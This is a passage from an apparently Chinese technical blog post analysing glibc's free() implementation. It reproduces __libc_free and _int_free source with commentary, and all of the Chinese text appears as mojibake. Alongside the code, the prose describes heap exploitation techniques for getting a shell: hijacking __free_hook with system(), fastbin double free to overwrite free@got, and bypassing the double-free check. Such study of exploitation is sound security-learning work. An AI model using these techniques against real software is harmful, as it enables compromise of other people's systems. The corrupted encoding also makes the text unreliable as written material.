ä¸­å¯»æ‰¾ã€‚</li><li>è‹¥<code>top_chunk</code>çš„å¤§å°å¤§äºç”¨æˆ·ç”³è¯·çš„ç©ºé—´çš„å¤§å°ï¼Œåˆ™å°†<code>top_chunk</code>æ‹†åˆ†ï¼Œè¿”å›ç¬¦åˆç”¨æˆ·è¦æ±‚çš„<code>chunk</code>ï¼Œå¹¶æ›´æ–°<code>last_remainder</code> ã€‚å¦åˆ™å°†å†ä¸€æ¬¡æ£€æŸ¥ <code>fast bin</code>ï¼Œå¦‚æœ <code>fast bin</code> ä¸ä¸ºç©ºï¼Œå°±è°ƒç”¨ <code>malloc_consolidate()</code> åˆå¹¶å †å—åå†æ¬¡ä»ç¬¬ 4 æ­¥å¼€å§‹é‡æ–°æŸ¥æ‰¾ã€‚</li><li>å¦‚æœå‰é¢çš„æ­¥éª¤ä¸­éƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ chunk ï¼Œæ‰ä¼šè°ƒç”¨ <code>sysmalloc()</code> é‡æ–°åˆ†é…ç©ºé—´å¹¶å¤„ç†åŸæœ¬çš„ <code>top chunk</code> ã€‚</li></ol><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><p><del>ä¸€å¼€å§‹è¿˜ä»¥ä¸º free æ²¡æœ‰ mallocè¿™ä¹ˆé•¿äº†å‘¢</del></p><p><code>free </code>å‡½æ•°ä¹Ÿæ˜¯ç”± <code>__libc_free</code> å‡½æ•°å®Œæˆ chunk çš„é‡Šæ”¾çš„æ“ä½œçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦è®¾ç½®äº† free_hook</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      <span class="hljs-comment">// å¦‚æœè®¾ç½®äº†å°±è°ƒç”¨ free_hook</span><br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-comment">//free(NULL) æ— ä»»ä½•æ„ä¹‰ï¼Œç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br>    <br>  <span class="hljs-comment">// å°†ç”¨æˆ·æä¾›çš„ mem æŒ‡é’ˆè½¬æ¢ä¸ºå †å—å¤´æŒ‡é’ˆ</span><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-comment">// åˆ¤æ–­ chunk æ˜¯å¦ç”± mmap åˆ†é…</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-comment">// å¦‚æœæ˜¯ mmap åˆ†é…çš„ï¼Œåˆ™é¦–å…ˆæ›´æ–° mmap åˆ†é…å’Œæ”¶ç¼©é˜ˆå€¼</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      <span class="hljs-comment">// é‡Šæ”¾ç©ºé—´</span><br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>  <span class="hljs-comment">// å¦‚æœä¸æ˜¯ mmap åˆ›å»ºï¼Œåˆ™è°ƒç”¨ _int_free å‡½æ•°</span><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿ <code>malloc</code> ä¸€æ ·ï¼Œå‡½æ•°ä¼šå…ˆè¯»å– <code>__free_hook</code> çœ‹çœ‹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™ç›´æ¥ç”± <code>free_hook</code> æŒ‡å‘çš„å‡½æ•°ä»£ä¸ºæ‰§è¡Œ <code>free</code> ï¼Œè¿™é‡Œä¹Ÿæ˜¯æˆ‘ä»¬ç»å¸¸åŠ«æŒçš„é’©å­å‡½æ•°ã€‚</p><p> <code>free_hook</code> åŠ«æŒèµ·æ¥æ¯” <code>malloc_hook</code> å›°éš¾ï¼Œä½†æ˜¯ä¸€æ—¦åŠ«æŒæˆåŠŸä¹Ÿä¼šå¾ˆæ–¹ä¾¿ã€‚ <code>malloc_hook</code> å‡½æ•°æˆ‘ä»¬åªèƒ½å†™ <code>one_gadget</code> ï¼Œè€Œä¸€æ—¦æ¡ä»¶è‹›åˆ»é‚£ä¹ˆå°±è¿˜å¾—è°ƒæ ˆå•Šä¹‹ç±»çš„ä¸€äº›æ“ä½œã€‚å¦‚æœåŠ«æŒåˆ°äº† <code>free_hook</code> æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å†™ <code>system()</code> å‡½æ•°ï¼Œç„¶å <code>free</code> ä¸€ä¸ªå†…å®¹ä¸º <code>&#39;/bin/sh&#39;</code> çš„å †å—å°±èƒ½ <code>get shell</code>ã€‚</p><h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯å„ç§å„æ ·çš„å‚æ•°å®šä¹‰å’Œé”™è¯¯æ£€æŸ¥ã€‚æˆ‘æŠŠæ³¨é‡Šåˆ æ‰äº†ï¼Œæ³¨é‡Šçš„æ„æ€å¤§æ¦‚å°±æ˜¯è¦æ£€æŸ¥ç”¨æˆ·æ˜¯ä¸æ˜¯è®¾ç½®äº†æ¶æ„å‚æ•°ã€‚</p><ul><li><code>__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</code>ï¼šæŒ‡é’ˆå’Œsizeè¿›è¡Œæ¯”è¾ƒï¼Œ<del>ä¸ç†è§£ä½†å°Šé‡</del>ã€‚ä¹Ÿå°±æ˜¯å¤§æ¦‚ <code>p&gt;0xfff....</code> ï¼Œä¸»è¦æ˜¯åº”è¯¥è¦æ£€æµ‹è¢« <code>free</code> çš„ <code>chunk</code> çš„ <code>size</code> ä¸è¦è¿‡å¤§ã€‚<code>size</code> å–è´Ÿä¹‹åä¼šå˜å¾—å¾ˆå¤§ï¼Œæ¯”å¦‚ <code>0xfff...</code> è¿™æ ·çš„å¤§æ•°å€¼é€šå¸¸æŒ‡é’ˆä¸ä¼šæŒ‡å‘è¿™æ ·çš„åœ°å€ï¼Œ<code>f</code> å¼€å¤´çš„ä¸€èˆ¬éƒ½æ˜¯å†…æ ¸åœ°å€ã€‚</li><li><code>__builtin_expect (misaligned_chunk (p), 0)</code>ï¼šè®¡ç®— chunk çš„æŒ‡é’ˆä¸ä¸Šæ©ç ï¼ˆ <code>0x10-1</code>ä¹Ÿå°±æ˜¯ <code>0xf</code> ï¼‰ï¼Œå–å‡ºåå››ä½è§‚å¯Ÿæ˜¯å¦ä¸º 0 ã€‚å¦‚æœä¸ä¸º 0 åˆ™è¯´æ˜æŒ‡é’ˆé”™è¯¯äº†ï¼Œå°±ä¼šæŠ¥é”™ã€‚è¿™é‡Œä¸»è¦æ˜¯æ£€æŸ¥å¯¹é½ï¼ŒæŒ‡é’ˆéœ€è¦æŒ‡åˆ° <code>0x10</code> çš„æ•´å€æ•°æ‰èƒ½è¢«æ­£å¸¸ <code>free</code> ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><br>check_inuse_chunk(av, p);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆæ˜¯åœ¨æ£€æŸ¥ï¼š</p><ul><li><code>size &lt; MINSIZE</code>ï¼šå¦‚æœ <code>size</code> è¿˜æ¯” <code>MINSIZE</code> è¦å°ï¼Œé‚£è‚¯å®š <code>size</code> é”™äº†ã€‚</li><li><code>!aligned_OK (size)</code>ï¼š<code>chunk size</code> ä¹Ÿè¦å¯¹é½ï¼Œä½†æ˜¯è¿™ä¸ª <code>check</code> ä¸€èˆ¬ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºå†å–å‡º <code>chunk size</code> çš„æ—¶å€™å°±ä¼šæŠŠæœ€ä½ä½ä¸æ‰ã€‚</li></ul><p> ç„¶åå°±æ˜¯å’Œ <code>malloc</code> é‡Œç›¸åŒçš„ check æ¥æ£€æŸ¥ <code>inuse</code> ä½ã€‚</p><h5 id="fast-bin-1"><a href="#fast-bin-1" class="headerlink" title="fast bin"></a>fast bin</h5><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­è¿™ä¸ªè¢« free çš„ chunk æ˜¯ä¸æ˜¯åœ¨ fastbin èŒƒå›´å†…äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åˆ¤æ–­è¿™ä¸ª chunk çš„å¤§å°æ˜¯ä¸æ˜¯å±äº fastbin ï¼Œä¸”å…¶åä¸€ä¸ª chunk ä¸æ˜¯ topchunk</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-comment">//åˆ¤æ–­ size æ˜¯å¦å°äº MINSIZE æˆ–è€…æ˜¯ size&gt;=system_mem</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç æ£€æŸ¥ <code>size</code> å¤§å°ï¼Œå¦‚æœå¤§å°æœ‰é—®é¢˜å°±ç”¨åˆ†é…å™¨çš„ lock å†æ¬¡åšä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœåˆ¤æ–­æ¡ä»¶è¿˜æ˜¯æˆç«‹çš„è¯é‚£å°±è¯´æ˜ <code>size</code> çœŸçš„è¢«æ”¹æˆäº†éæ³•æ•°å€¼ï¼Œé‚£å°±æŠ¥é”™é€€å‡ºã€‚å¦‚æœè¿›æ¥äº†ä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæŠ¥é”™ï¼Œè¯´æ˜å¯èƒ½å¤šçº¿ç¨‹æœ‰ç‚¹é—®é¢˜ï¼Œå°±é‡Šæ”¾è¿™ä¸ª <code>arena</code> çš„é”ã€‚</p><p>æ£€æŸ¥å®Œæ¯•å°±å¼€å§‹é‡Šæ”¾è¿™ä¸ª chunkï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">//æ¸…ç† fastbin ä¸­çš„æ•°æ®</span><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>   <br><span class="hljs-comment">//åˆå§‹åŒ– fastbin</span><br>   set_fastchunks(av);<br><span class="hljs-comment">// è·å– size å¯¹åº”çš„ fastbin ä¸‹æ ‡</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>   fb = &amp;fastbin (av, idx);<br>   <br>   <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>   mchunkptr old = *fb, old2;<br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>   <span class="hljs-keyword">do</span><br>     &#123;<br>   <br>   <span class="hljs-comment">// åˆ¤æ–­å½“å‰ fastbin å¤´ chunk ä¸è¦è¢«é‡Šæ”¾çš„ chunk æ˜¯å¦ç›¸åŒï¼ˆé˜²æ­¢ double freeï¼‰</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>     &#123;<br>       errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>       <span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>       <br>   <span class="hljs-comment">// å°†è¦è¢«é‡Šæ”¾çš„ chunk æ”¾å…¥ fastbin å¤´éƒ¨ï¼Œä¿®æ”¹å…¶ fd æŒ‡é’ˆæŒ‡å‘ old</span><br>   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>     old_idx = fastbin_index(chunksize(old));<br>   p-&gt;fd = old2 = old;<br>     &#125;<br>   <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>   <br>   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>     &#123;<br>   errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>   <span class="hljs-keyword">goto</span> errout;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>å®ƒé¦–å…ˆè°ƒç”¨äº† ä¸€ä¸ª <code>free_perturb()</code> å‡½æ•°ï¼Œå‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">free_perturb</span> <span class="hljs-params">(<span class="hljs-type">char</span> *p, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (perturb_byte))<br>    <span class="hljs-built_in">memset</span> (p, perturb_byte, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®è·Ÿå‰é¢ <code>malloc</code> é‚£ä¸ªå‡½æ•°å·®ä¸å¤šï¼Œå°±æ˜¯çœ‹ä½ æœ‰æ²¡æœ‰è®¾ç½®é‚£ä¸ªå€¼ï¼Œå¦‚æœè®¾ç½®äº†å°±åœ¨ <code>free</code> ä¹‹å‰æŠŠå †å—è¿›è¡Œ <code>memset</code> æ¸…ç©ºï¼Œä½†æ˜¯ä¸ä¸€æ ·çš„æ˜¯ï¼Œ<code>perturb</code> ä¸­ <code>memset</code> ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ ¹æ®ä½ è®¾ç½®çš„å€¼å†å¼‚æˆ–ä¸€ä¸ª <code>0xff</code> çš„ã€‚</p><p>å…¶ä¸­æœ‰ä¸€ä¸ªæ£€æŸ¥æ—¶é’ˆå¯¹ double free çš„ï¼Œé‚£ä¹ˆå¦‚æœçœŸçš„ double free äº†æ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ <code>free(A)</code> ï¼Œç¬¬ä¸€æ¬¡ <code>free</code>  Aï¼Œå¯¹åº”çš„ bin ä¸ºç©ºï¼Œè¿™ä¸ª chunk é“¾å…¥å…¶ä¸­ï¼Œç°åœ¨ <code>fast bin</code> ä¸­å¤šäº†ä¸€ä¸ª A ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç¬¬äºŒæ¬¡ <code>free(A)</code> ï¼ŒA ä¼šå†æ¬¡è¢«åŠ å…¥ <code>fast bin</code> ä¸­ï¼Œç„¶åä¼šå¯¼è‡´äº§ç”Ÿä¸€ä¸ªè‡ªå·±æŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆã€‚è¿™æ—¶ <code>fast bin</code>ä¸­çš„æƒ…å†µå°±æ˜¯ä¸¤ä¸ªAï¼Œ<code>A-&gt;A</code>ã€‚æ­¤æ—¶æˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªå’Œ A ä¸€æ ·å¤§çš„ <code>chunk</code> ï¼ŒA è¢«ç”³è¯·èµ°ï¼Œä½†æ˜¯<code>fast bin</code> é“¾ä¸­è¿˜å‰©ä¸‹ä¸€ä¸ª Aï¼Œä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬æ‰‹é‡Œæœ‰ä¸€ä¸ª A ï¼Œ<code>fast bin</code> ä¸­ä¹Ÿæœ‰ä¸€ä¸ª A ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç¼–è¾‘ A çš„æŒ‡é’ˆåŸŸäº†ã€‚æ¯”å¦‚æˆ‘è®©å®ƒæŒ‡å‘äº† got è¡¨ä¸­çš„ <code>free()</code> å‡½æ•°ã€‚é‚£ä¹ˆæ­¤æ—¶ <code>fast bin</code> ä¸­çš„æƒ…å†µå°±æ˜¯ <code>A-&gt;free@got</code> ã€‚ç„¶åæˆ‘å†æ¬¡ç”³è¯·å’Œ A ä¸€æ ·å¤§å°çš„ <code>chunk</code> ï¼ŒA è¢«å–å‡ºæ¥ï¼Œ <code>fast bin</code> ä¸­å‰©ä¸‹<code>free@got</code> ã€‚é‚£ä¹ˆæˆ‘ç¬¬ä¸‰æ¬¡ç”³è¯·å°±å¾—åˆ°äº†åœ¨ <code>free@got</code> é‚£è¾¹çš„ <code>chunk</code> ï¼Œç„¶åå‡å¦‚æˆ‘å·å·ä¿®æ”¹ä¸€ä¸‹ <code>free@got</code> ä¸º <code>system()</code> ï¼Œé‚£å°±èƒ½ get shell äº†ã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>free@got</code> è¿™ä¸ªæŒ‡é’ˆæ˜¯èƒ½ä»»æ„ç¼–è¾‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘æƒ³ç”³è¯·åˆ°å“ªéƒ½ä¸æ˜¯é—®é¢˜ï¼Œè¿™æ ·å°±èƒ½ä»»æ„åœ°å€å†™äº†ã€‚</p><p>æˆ‘ä»¬ä¹Ÿæœ‰æ–¹æ³•æ¥ç»•è¿‡ double free æ£€æŸ¥ã€‚å› ä¸ºå¯¹äº double free çš„æ£€æŸ¥åªæœ‰è¿™é‡Œä¸€å¤„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å…ˆ <code>free(A)</code> å† <code>free(B)</code>ï¼Œå† <code>free(A)</code> ï¼Œè¿™æ ·å°±é€ æˆ double free å•¦ï¼</p><p>å¦‚æœè¿‡äº†æ£€æµ‹ï¼Œå°±å°†è¿™ä¸ª chunk é“¾åœ¨ <code>fast bin</code> çš„é¡¶éƒ¨ï¼Œå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„å•é“¾è¡¨çš„æ’å…¥ã€‚å› ä¸ºåè¿›å…ˆå‡ºï¼Œæ‰€ä»¥åªåœ¨ <code>fast bin</code> çš„ä¸€ç«¯æ’å…¥åˆ é™¤ã€‚</p><h5 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h5><p>å®ƒä¸€å…±å°±ä¸‰ä¸ªå¤§çš„ <code>if-else</code> åˆ†æ”¯æ¡ä»¶ï¼Œæ˜¯ä¸æ˜¯å±äº <code>large bin</code> ã€æ˜¯ä¸æ˜¯å±äº <code>mmap</code> åˆ†é…ï¼Œå’Œå…¶ä»–æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ <code>unsorted bin</code> ã€‚</p><p>å¦‚æœchunkæ˜¯ <code>mmap</code> åˆ†é…çš„è¯é‚£å°±è°ƒç”¨ <code>munmap_chunk()</code> å‡½æ•°å» <code>free</code> è¿™ä¸ª chunkã€‚è¿™éƒ¨åˆ†ä»£ç å°±åœ¨ <code>_int_free</code> å‡½æ•°çš„æœ€åï¼Œæˆ‘ä»¬ä¸å»è®¨è®ºè¿™éƒ¨åˆ†å…·ä½“çš„ä»£ç å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥åˆ†æ <code>unsorted bin</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>   <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>     <span class="hljs-comment">//ç”¨ä¸€ä¸ªåˆ†é…å™¨çš„æ—¶å€™å…ˆåŠ é”ï¼Œç”¨å®Œäº†é‡Šæ”¾</span><br>     (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>     locked = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-comment">// è·å– next_chunk</span><br>   nextchunk = chunk_at_offset(p, size);<br><br>   <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">      top block.  */</span><br>   <span class="hljs-comment">// æ£€æŸ¥å½“å‰ chunk æ˜¯å¦æ˜¯ top chunk å¤´ï¼ˆé˜²æ­¢ double freeï¼‰</span><br>   <span 